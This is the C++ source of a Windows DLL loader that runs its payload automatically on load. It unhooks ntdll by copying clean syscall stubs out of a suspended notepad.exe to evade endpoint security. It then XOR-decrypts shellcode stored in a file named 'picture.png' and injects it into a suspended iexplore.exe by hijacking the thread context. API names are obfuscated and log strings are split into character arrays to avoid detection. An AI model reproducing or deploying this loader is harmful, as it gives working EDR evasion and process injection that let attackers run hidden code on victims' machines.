#include <windows.h>
#include <stdio.h>
#include "functions.h"

#define STATUS_SUCCESS 0
#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )

char KEY[] = "pav79seft6ubrnu7emx6r9ed42n87zov7xp1mmqvyujuyetjy1";

//Following functions are copied from HellsGate : https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c

BOOL GetImageExportDirectory(PVOID ntdllBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory)
{
    //Get DOS header
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)ntdllBase + pImageDosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }
    // Get the EAT
    *ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)ntdllBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    return TRUE;
}

PVOID GetTableEntry(PVOID ntdllBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, CHAR* findfunction)
{
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)ntdllBase + pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ntdllBase + pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ntdllBase + pImageExportDirectory->AddressOfNameOrdinals);
    PVOID funcAddress = 0x00;
    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)ntdllBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)ntdllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (my_strcmp(findfunction, pczFunctionName) == 0)
        {
            WORD cw = 0;
            while (TRUE)
            {
                if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
                {
                    return 0x00;
                }

                // check if ret, in this case we are also probaly too far
                if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
                {
                    return 0x00;
                }

                if (*((PBYTE)pFunctionAddress + cw) == 0x4c
                    && *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
                    && *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
                    && *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
                    && *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
                    && *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
                    BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
                    BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
                    WORD syscall = (high << 8) | low;
                    return pFunctionAddress;
                    break;
                }
                cw++;
            }
        }
    }
    return funcAddress;
}

DWORD protectingMe(PVOID textBase, DWORD flProtect, SIZE_T size)
{
    DWORD oldprotect = NULL;

    NTSTATUS status = rpfgpexnugkeFunc(NtCurrentProcess(), &textBase, (PULONG)&size, flProtect, &oldprotect);
    if (status == STATUS_SUCCESS) {
        return oldprotect;
    }
    return NULL;
}

void WhatsOverwriting(PVOID ntdllBase, PVOID freshntDllBase, PIMAGE_EXPORT_DIRECTORY hooked_pImageExportDirectory, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PIMAGE_SECTION_HEADER textsection)
{
    
    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)ntdllBase + hooked_pImageExportDirectory->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < hooked_pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)ntdllBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)ntdllBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (strstrFunc(pczFunctionName, (CHAR*)"Nt") != NULL)
        {
            PVOID funcAddress = GetTableEntry(freshntDllBase, pImageExportDirectory, pczFunctionName);
            if (funcAddress != 0x00 && my_strcmp((CHAR*)"NtAccessCheck", pczFunctionName) != 0)
            {
                //Change the write permissions of the .text section of the ntdll in memory
                DWORD oldprotect = protectingMe((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)textsection->VirtualAddress), PAGE_EXECUTE_WRITECOPY, textsection->Misc.VirtualSize);
                //Copy the syscall stub from the fresh ntdll.dll to the hooked ntdll
                bzbhxuhreuvmbi((LPVOID)pFunctionAddress, (LPVOID)funcAddress, 23);
                //Change back to the old permissions
                protectingMe((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)textsection->VirtualAddress), oldprotect, textsection->Misc.VirtualSize);
            }
        }
    }
}

void SomeReplacing(PVOID ntdllBase, PVOID freshntDllBase, PIMAGE_SECTION_HEADER textsection)
{
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;

    if (!GetImageExportDirectory(freshntDllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
        {}
        
    
        

    PIMAGE_EXPORT_DIRECTORY hooked_pImageExportDirectory = NULL;
    if (!GetImageExportDirectory(ntdllBase, &hooked_pImageExportDirectory) || hooked_pImageExportDirectory == NULL)
    {}

    WhatsOverwriting(ntdllBase, freshntDllBase, hooked_pImageExportDirectory, pImageExportDirectory, textsection);
}




extern "C" void exec() {
    
    // Function names
	NTSTATUS status = NULL;
    LoadFunctionBeforeUnhooking();
   
    // ntdll unhooking
    STARTUPINFO siSuspended;
    PROCESS_INFORMATION piSuspended;
    ZeroMemory(&siSuspended, sizeof(siSuspended));
    siSuspended.cb = sizeof(siSuspended);
    ZeroMemory(&piSuspended, sizeof(piSuspended));

    BOOL flag = tvgzqnoeihfhFunc(
        NULL,
        (LPSTR)"notepad.exe",
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
        NULL,
        "C:\\Windows\\System32\\",
        (LPSTARTUPINFOA)&siSuspended,
        &piSuspended
    );
    WCHAR createdSuspendedProcess[] = { L'[', L'+', L']', L' ', L'C', L'r', L'e', L'a', L't', L'e', L'd', L' ', L'S', L'u', L's', L'p', L'e', L'n', L'd', L'e', L'd', L' ', L'p', L'r', L'o', L'c', L'e', L's', L's', L'.', L'.',  L'\n', 0x00 };
    pxrqfhqypmkeFunc(createdSuspendedProcess);
    WCHAR findname[] = L"ntdll.dll\x00";

    PVOID ntdllBase = GetDll(findname);
    
    PIMAGE_DOS_HEADER ImgDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    PIMAGE_NT_HEADERS ImgNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + (ImgDosHeader->e_lfanew));
    IMAGE_OPTIONAL_HEADER OptHeader = (IMAGE_OPTIONAL_HEADER)ImgNTHeaders->OptionalHeader;
    PIMAGE_SECTION_HEADER textsection = IMAGE_FIRST_SECTION(ImgNTHeaders);

    SIZE_T ntdllSize = OptHeader.SizeOfImage;

    LPVOID freshNtdll = NULL;
    status = chnplwnpriqyFunc(
        NtCurrentProcess(),
        &freshNtdll,
        NULL,
        &ntdllSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (status != STATUS_SUCCESS) {
        WCHAR failedToAllocate[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'a', L'l', L'l', L'o', L'c', L'a', L't', L'e', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L' ', L'f', L'o', L'r', L' ', L't', L'h', L'e', L' ', L'u', L'n', L'h', L'o', L'o', L'k', L'i', L'n', L'g', L'.', L'.',  L'\n', 0x00 };
        pxrqfhqypmkeFunc(failedToAllocate);
        return;
    }

    WCHAR AllocatedMemrory[] = { L'[', L'+', L']', L' ', L'A', L'l', L'l', L'o', L'c', L'a', L't', L'e', L'd', L' ', L'v', L'i', L'r', L't', L'u', L'a', L'l', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L' ', L'o', L'f', L' ', L'n', L'o', L't', L'e', L'p', L'a', L'd', L'.', L'e', L'x', L'e',  L'\n', 0x00 };
    pxrqfhqypmkeFunc(AllocatedMemrory);

    DWORD bytesread = NULL;
    status = zexuaydozwbpFunc(
        piSuspended.hProcess,
        ntdllBase,
        freshNtdll,
        ntdllSize,
        &bytesread
    );
    if (status != STATUS_SUCCESS) {
        WCHAR failedToReadVirtual[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'r', L'e', L'a', L'd', L' ', L'v', L'i', L'r', L't', L'u', L'a', L'l', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L'!',  L'\n', 0x00 };
        pxrqfhqypmkeFunc(failedToReadVirtual);
        return;
    }

    SomeReplacing(ntdllBase, freshNtdll, textsection);
    
    eqsxvbarvtddFunc(piSuspended.hProcess, 0);
    lgaebehmwwjoFunc(piSuspended.hProcess);
    lgaebehmwwjoFunc(piSuspended.hThread);

    WCHAR finishedReplace[] = { L'[', L'+', L']', L' ', L'F', L'i', L'n', L'i', L's', L'h', L'e', L'd', L' ', L'r', L'e', L'p', L'l', L'a', L'c', L'e', L' ', L'n', L't', L'd', L'l', L'l', L' ', L'f', L'r', L'o', L'm', L' ', L's', L'u', L's', L'p', L'e', L'n', L'd', L'e', L'd', L' ', L'p', L'r', L'o', L'c', L'e', L's', L's',  L'\n', 0x00 };
    pxrqfhqypmkeFunc(finishedReplace);

    LoadFunctionsAfterUnhooking();

    // Thread Hijacking
    HANDLE hFile = aorclcchegyuFunc(
        "picture.png", // change it to the file name of the encrypted shellcode
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        WCHAR invaliaHandle[] = { L'[', L'-', L']', L' ', L'I', L'n', L'v', L'a', L'l', L'i', L'd', L' ', L'H', L'a', L'n', L'd', L'l', L'e', L' ', L'V', L'a', L'l', L'u', L'e',  L'\n', 0x00 };
        pxrqfhqypmkeFunc(invaliaHandle);
        return;
    }

    SIZE_T fileSize = zlwmhqsfvcquFunc(hFile, NULL);

    LPVOID fileData = NULL;
    status = chnplwnpriqyFunc(
        NtCurrentProcess(),
        &fileData,
        NULL,
        &fileSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (fileData == NULL) {
        WCHAR failedToAllocate[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'a', L'l', L'l', L'o', L'c', L'a', L't', L'e', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L' ', L'f', L'o', L'r', L' ', L's', L'h', L'e', L'l', L'l', L'c', L'o', L'd', L'e', L'.',  L'\n', 0x00 };
        pxrqfhqypmkeFunc(failedToAllocate);
        return;
    }

    DWORD BytesRead = NULL;

    flag = cyertryxidbuFunc(
        hFile,
        fileData,
        fileSize,
        &BytesRead,
        NULL
    );
    if (!flag) {
        WCHAR errorcyertryxidbu[] = { L'[', L'-', L']', L' ', L'E', L'r', L'r', L'o', L'r', L' ', L'r', L'e', L'a', L'd', L'i', L'n', L'g', L' ', L't', L'h', L'e', L' ', L'f', L'i', L'l', L'e', L'!', L' ',  L'\n', 0x00 };
        pxrqfhqypmkeFunc(errorcyertryxidbu);
        return;
    }

    WCHAR readShellcode[] = { L'[', L'+', L']', L' ', L'R', L'e', L'a', L'd', L' ', L's', L'h', L'e', L'l', L'l', L'c', L'o', L'd', L'e', L' ', L'f', L'i', L'l', L'e', L'!',  L'\n', 0x00 };
    pxrqfhqypmkeFunc(readShellcode);

    unsigned char* shellcode = (unsigned char*)fileData;

    STARTUPINFOA si = {
        sizeof(si)
    };
    PROCESS_INFORMATION pi;
    
    flag = tvgzqnoeihfhFunc(
        "C:\\Program Files\\Internet Explorer\\iexplore.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        (LPSTARTUPINFOA)&si,
        &pi
    );

    if (!flag) {
        WCHAR errorCreateProcess[] = { L'[', L'-', L']', L' ', L'E', L'r', L'r', L'o', L'r', L' ', L'c', L'r', L'e', L'a', L't', L'i', L'n', L'g', L' ', L'p', L'r', L'o', L'c', L'e', L's', L's', L'.', L'.',  L'\n', 0x00 };
        pxrqfhqypmkeFunc(errorCreateProcess);
        return;
    }

    LPVOID exec = NULL;

    status = chnplwnpriqyFunc(
        pi.hProcess,
        &exec,
        NULL,
        &fileSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (status != STATUS_SUCCESS) {
        WCHAR failedToAllocatememory[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'a', L'l', L'l', L'o', L'c', L'a', L't', L'e', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L'!',  L'\n', 0x00 };
        pxrqfhqypmkeFunc(failedToAllocatememory);
        return;
    }

    WCHAR allocatedMemory[] = { L'[', L'+', L']', L' ', L'A', L'l', L'l', L'o', L'c', L'a', L't', L'e', L'd', L' ', L'M', L'e', L'm', L'o', L'r', L'y', L'!',  L'\n', 0x00 };
    pxrqfhqypmkeFunc(allocatedMemory);

    XOR(shellcode, fileSize, KEY, sizeof(KEY));
    WCHAR decryptedshellcode[] = { L'[', L'+', L']', L' ', L'D', L'e', L'c', L'r', L'y', L'p', L't', L'e', L'd', L' ', L's', L'h', L'e', L'l', L'l', L'c', L'o', L'd', L'e', L' ', L'f', L'i', L'l', L'e', L'!',  L'\n', 0x00 };
    pxrqfhqypmkeFunc(decryptedshellcode);

    DWORD oldprotect = NULL;

    status = rpfgpexnugkeFunc(
        pi.hProcess,
        &exec,
        (PULONG)&fileSize,
        PAGE_EXECUTE_READWRITE,
        &oldprotect
    );
    if (status != STATUS_SUCCESS) {
        WCHAR failedToProtect[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'p', L'r', L'o', L't', L'e', L'c', L't', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L'!',  L'\n', 0x00 };
        pxrqfhqypmkeFunc(failedToProtect);
        return;
    }
    WCHAR protectedMemory[] = { L'[', L'+', L']', L' ', L'P', L'r', L'o', L't', L'e', L'c', L't', L'e', L'd', L' ', L'M', L'e', L'm', L'o', L'r', L'y', L'!',  L'\n', 0x00 };
    pxrqfhqypmkeFunc(protectedMemory);


    status = ezrjzfjjdkqxFunc(
        pi.hProcess,
        exec,
        shellcode,
        fileSize,
        NULL
    );
    if (status != STATUS_SUCCESS) {
        WCHAR failedToWrite[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'w', L'r', L'i', L't', L'e', L' ', L'm', L'e', L'm', L'o', L'r', L'y', L'!',  L'\n', 0x00 };
        pxrqfhqypmkeFunc(failedToWrite);
        return;
    }

    WCHAR payloadWritten[] = { L'[', L'+', L']', L' ', L'P', L'a', L'y', L'l', L'o', L'a', L'd', L' ', L'w', L'r', L'i', L't', L't', L'e', L'n', L'!',  L'\n', 0x00 };
    pxrqfhqypmkeFunc(payloadWritten);

    CONTEXT CT;
    CT.ContextFlags = CONTEXT_FULL;

    if (!mztrdriqwotfFunc(pi.hThread, &CT)) {
        WCHAR failedGetThread[] = { L'[', L'-', L']', L' ', L'F', L'a', L'i', L'l', L'e', L'd', L' ', L't', L'o', L' ', L'g', L'e', L't', L' ', L'T', L'h', L'r', L'e', L'a', L'd', L' ', L'C', L'o', L'n', L't', L'e', L'x', L't',  L'\n', 0x00 };
        pxrqfhqypmkeFunc(failedGetThread);
        return;
    }

    CT.Rip = (DWORD64)exec;

    if (!buqefpmwmduyFunc(pi.hThread, &CT)) {
        WCHAR errorSettingThread[] = { L'[', L'-', L']', L' ', L'E', L'r', L'r', L'o', L'r', L' ', L's', L'e', L't', L't', L'i', L'n', L'g', L' ', L't', L'h', L'r', L'e', L'a', L'd', L' ', L'c', L'o', L'n', L't', L'e', L'x', L't',  L'\n', 0x00 };
        pxrqfhqypmkeFunc(errorSettingThread);
        return;
    }

    WCHAR wqwxjlulhemuing[] = { L'[', L'+', L']', L' ', L'S', L'l', L'e', L'e', L'p', L'i', L'n', L'g', L' ', L'5', L' ', L's', L'e', L'c', L'o', L'n', L'd', L's', L'.', L'.',  L'\n', 0x00 };
    pxrqfhqypmkeFunc(wqwxjlulhemuing);

    wqwxjlulhemuFunc(5);

    nkokllmibpvkFunc(pi.hThread);

    WCHAR success[] = { L'[', L'+', L']', L' ', L'P', L'r', L'o', L'c', L'e', L's', L's', L' ', L'h', L'o', L'l', L'l', L'o', L'w', L'i', L'n', L'g', L' ', L's', L'u', L'c', L'c', L'e', L's', L's', L'f', L'u', L'l', L'!',  L'\n', 0x00 };
    pxrqfhqypmkeFunc(success);

    lgaebehmwwjoFunc(hFile);
    lgaebehmwwjoFunc(pi.hProcess);
    lgaebehmwwjoFunc(pi.hThread);
    return;
}

BOOL WINAPI DllMain(HMODULE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    
	switch (fdwReason) {
		case DLL_PROCESS_ATTACH:
    		exec();
			break;

		case DLL_THREAD_ATTACH:
			break;
		case DLL_THREAD_DETACH:
			break;
		case DLL_PROCESS_DETACH:
			break;
    }

    return TRUE;
}
